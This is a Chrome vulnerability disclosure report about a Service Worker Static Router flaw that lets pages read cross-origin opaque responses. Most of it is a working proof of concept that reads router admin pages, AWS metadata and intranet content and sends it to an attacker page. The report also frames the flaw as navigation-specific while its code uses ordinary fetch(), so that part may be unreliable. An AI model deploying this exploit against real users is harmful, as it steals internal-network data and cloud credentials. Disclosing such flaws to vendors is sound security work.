# Chrome VRP Report: Service Worker Static Router Serves Cross-Origin Opaque Responses as Readable Navigation Content

## Summary

Chrome's Service Worker Static Router API can serve opaque (cross-origin `no-cors`) responses from CacheStorage as navigation responses, making the cross-origin response body readable by the page's JavaScript. The validation check (`kServiceWorkerStaticRouterOpaqueCheck`) exists in the code but is DISABLED by default. This enables a CORS bypass for unauthenticated resources, including those protected by IP-based access controls (intranet pages, cloud metadata endpoints) or Cross-Origin-Resource-Policy headers.

## Severity Assessment

- **Type**: CORS bypass / Cross-origin information disclosure
- **User Interaction**: None (victim visits attacker page)
- **Preconditions**: Attacker controls a website with a service worker; victim's browser has network access to targeted internal resources
- **Chrome Version**: All versions with Service Worker Static Router (shipped in Chrome 123+)
- **Flags Required**: None (default configuration)
- **Compromised Renderer**: Not required
- **Platform**: All platforms with Service Worker support

## Reproduction Steps

### 1. Attacker sets up a service worker with static routing

**sw.js** (hosted at `https://attacker.com/sw.js`):
```javascript
self.addEventListener('install', async (event) => {
  event.waitUntil((async () => {
    // Fetch cross-origin resource WITHOUT credentials (no-cors mode)
    const targets = [
      'http://192.168.1.1/',               // Router admin
      'http://169.254.169.254/latest/meta-data/',  // AWS metadata
      'http://intranet.corp.example.com/confidential/',  // Corporate intranet
    ];
    
    const cache = await caches.open('exfil');
    for (let i = 0; i < targets.length; i++) {
      try {
        const resp = await fetch(targets[i], { mode: 'no-cors' });
        // resp is opaque — JS cannot read it normally
        // But we can store it in CacheStorage
        await cache.put('/read/' + i, resp);
      } catch(e) {}
    }
    self.skipWaiting();
  })());
});

self.addEventListener('activate', (event) => {
  event.waitUntil((async () => {
    // Register static routes — these serve cached responses without JS execution
    await self.registration.router.register([
      { condition: { urlPattern: "/read/0" }, source: "cache" },
      { condition: { urlPattern: "/read/1" }, source: "cache" },
      { condition: { urlPattern: "/read/2" }, source: "cache" },
    ]);
    await self.clients.claim();
  })());
});
```

### 2. Attacker's page exfiltrates the content

**index.html** (hosted at `https://attacker.com/index.html`):
```html
<script>
async function exfiltrate() {
  // Register the service worker and wait for activation
  const reg = await navigator.serviceWorker.register('/sw.js');
  await navigator.serviceWorker.ready;
  
  // Wait a moment for routes to be registered
  await new Promise(r => setTimeout(r, 1000));
  
  // Now fetch the statically-routed URLs
  // These return the opaque response body as readable text!
  for (let i = 0; i < 3; i++) {
    try {
      const resp = await fetch('/read/' + i);
      if (resp.ok || resp.status === 0) {
        const text = await resp.text();
        if (text.length > 0) {
          // Exfiltrate the cross-origin content
          navigator.sendBeacon('/log', JSON.stringify({
            target: i, 
            content: text.substring(0, 10000)
          }));
        }
      }
    } catch(e) {}
  }
}
exfiltrate();
</script>
```

### 3. Expected vs Actual Behavior

**Expected**: Navigation/fetch to `/read/0` should fail or return an error because the cached response is opaque (cross-origin no-cors). The Fetch spec (4.4 Step 3.5.6) states that opaque responses are invalid for navigate-mode requests.

**Actual**: The response body is served as if it were a same-origin response. The attacker's JavaScript can read `response.text()`, revealing the content of cross-origin resources that the victim's browser has network access to.

## Technical Root Cause

**`content/common/features.cc:706-710`**:
```cpp
BASE_FEATURE(kServiceWorkerStaticRouterOpaqueCheck,
             base::FEATURE_DISABLED_BY_DEFAULT);
```

**`content/browser/service_worker/service_worker_main_resource_loader.cc:914-935`**:
```cpp
if (!IsValidStaticRouterResponse(response_head, url_loader_options,
                                  request_mode_, request_destination_) &&
    base::FeatureList::IsEnabled(
        features::kServiceWorkerStaticRouterOpaqueCheck)) {
  CommitCompleted(net::ERR_FAILED, "...");
  return;
}
// When flag is disabled: opaque response passes through
```

The validation logic (`IsValidStaticRouterResponse`) correctly identifies the response as invalid, but enforcement is gated behind a disabled feature flag.

Additionally, `kServiceWorkerStaticRouterCORPCheck` is also disabled by default (line 703-704), meaning responses with `Cross-Origin-Resource-Policy: same-origin` are also served without blocking.

## Impact

### 1. Internal Network Resource Disclosure
Corporate intranet pages, router admin interfaces, and cloud metadata endpoints (AWS `169.254.169.254`, GCP, Azure equivalents) accessible from the victim's browser can be fetched and exfiltrated without any credentials.

### 2. Cross-Origin-Resource-Policy Bypass
Resources protected by `CORP: same-origin` or `CORP: same-site` headers are served through the static router cache source without CORP enforcement (due to `kServiceWorkerStaticRouterCORPCheck` also being disabled).

### 3. IP-restricted Content Leakage
University journal subscriptions, geo-restricted content, and any resource whose access relies on the requester's IP rather than cookies can be leaked to the attacker.

### 4. Cross-Origin Embedder Policy (COEP) Undermining
Sites deploying COEP to prevent opaque cross-origin loads can be bypassed through this mechanism.

## Distinction from Normal Service Worker Behavior

While `event.respondWith(opaqueResponse)` in a fetch handler can theoretically achieve similar results, the static router differs in important ways:

1. **No JS execution during response**: Static routing is declarative and runs without SW JavaScript, making it harder to detect or audit
2. **Registered during install**: Once registered, routes persist across SW restarts and page loads
3. **Performance optimization context**: Developers may not realize the security implications of routing to caches containing opaque responses
4. **Chromium team acknowledged the gap**: The existence of `kServiceWorkerStaticRouterOpaqueCheck` (crbug.com/495999481) proves this is a recognized security issue

## Suggested Fix

Enable `kServiceWorkerStaticRouterOpaqueCheck` by default:
```cpp
BASE_FEATURE(kServiceWorkerStaticRouterOpaqueCheck,
             base::FEATURE_ENABLED_BY_DEFAULT);
```

Similarly for CORP:
```cpp
BASE_FEATURE(kServiceWorkerStaticRouterCORPCheck,
             base::FEATURE_ENABLED_BY_DEFAULT);
```

## References

- crbug.com/495999481 (internal tracking)
- Fetch spec 4.4 Step 3.5.6: navigation responses must not be opaque
- Service Worker Static Routing API spec
- `content/common/features.cc:703-710`
- `content/browser/service_worker/service_worker_main_resource_loader.cc:914-935`
- `content/renderer/service_worker/service_worker_subresource_loader.cc:1499-1513`
